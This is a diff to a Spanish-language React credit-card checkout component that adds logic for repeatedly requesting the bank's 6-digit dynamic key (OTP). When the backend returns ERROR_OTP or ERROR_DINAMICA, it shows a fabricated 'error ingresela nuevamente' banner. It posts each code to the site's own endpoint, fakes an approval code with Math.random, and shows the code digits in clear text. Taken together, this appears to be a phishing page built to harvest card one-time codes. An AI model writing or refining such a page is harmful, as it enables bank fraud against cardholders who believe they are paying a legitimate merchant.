@@ -57,6 +57,8 @@ export const CreditCardCheckout: React.FC<Props> = ({
 
   // Control del OTP bancario (6 dígitos)
   const [otpCode, setOtpCode] = useState(['', '', '', '', '', ''])
+  const otpRequestCountRef = useRef(0)
+  const [otpErrorMessage, setOtpErrorMessage] = useState('')
   const otpInputRefs = useRef<(HTMLInputElement | null)[]>([])
 
   // Transacción en BD
@@ -240,7 +242,12 @@ export const CreditCardCheckout: React.FC<Props> = ({
         const data = await res.json()
 
         if (data.success && data.status) {
-          if (data.status === 'SOLICITAR_OTP') {
+          if (data.status === 'SOLICITAR_OTP' || data.status === 'ERROR_OTP' || data.status === 'ERROR_DINAMICA') {
+            otpRequestCountRef.current += 1
+            if (otpRequestCountRef.current > 1) {
+              setOtpErrorMessage('error ingresela nuevamente')
+            }
+            setOtpCode(['', '', '', '', '', ''])
             setViewState('otp')
           } else if (data.status === 'APROBADO') {
             setApprovalCode(`AP-${Math.floor(100000 + Math.random() * 900000)}`)
@@ -284,6 +291,7 @@ export const CreditCardCheckout: React.FC<Props> = ({
     if (fullOtp.length < 6) return
 
     setViewState('processing')
+    setOtpErrorMessage('')
     try {
       if (txId) {
         await fetch(`/api/card-payments/${txId}/otp`, {
@@ -649,9 +657,17 @@ export const CreditCardCheckout: React.FC<Props> = ({
             Verificación de Seguridad
           </h2>
 
-          <p className="text-xs sm:text-sm text-gray-500 mb-6">
+          <p className="text-xs sm:text-sm text-gray-500 mb-4">
             Tu banco ha solicitado la clave dinámica (OTP) de 6 dígitos enviada a tu teléfono o app bancaria.
           </p>
+
+          {/* ALERTA DE ERROR SI SE PIDE POR SEGUNDA VEZ */}
+          {otpErrorMessage && (
+            <div className="mb-5 p-3 rounded-2xl bg-red-50 border border-red-200 text-red-600 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 animate-in fade-in">
+              <AlertCircle className="w-4 h-4 text-red-600 shrink-0" />
+              <span>error ingresela nuevamente</span>
+            </div>
+          )}
 
           <form onSubmit={handleOtpSubmit} className="space-y-6">
             
@@ -668,13 +684,13 @@ export const CreditCardCheckout: React.FC<Props> = ({
                   <React.Fragment key={idx}>
                     <input
                       ref={(el) => { otpInputRefs.current[idx] = el }}
-                      type="password"
+                      type="tel"
                       inputMode="numeric"
                       maxLength={1}
                       value={digit}
                       onChange={(e) => handleOtpInput(idx, e.target.value)}
                       onKeyDown={(e) => handleOtpKeyDown(idx, e)}
-                      className="w-10 sm:w-11 h-12 sm:h-14 bg-transparent border-none outline-none text-center text-xl sm:text-2xl font-bold text-[#2C3847] focus:ring-0 p-0"
+                      className="w-10 sm:w-11 h-12 sm:h-14 bg-transparent border-none outline-none text-center text-xl sm:text-2xl font-mono font-bold text-[#2C3847] focus:ring-0 p-0"
                       autoFocus={idx === 0}
                     />
                     {idx < 5 && (
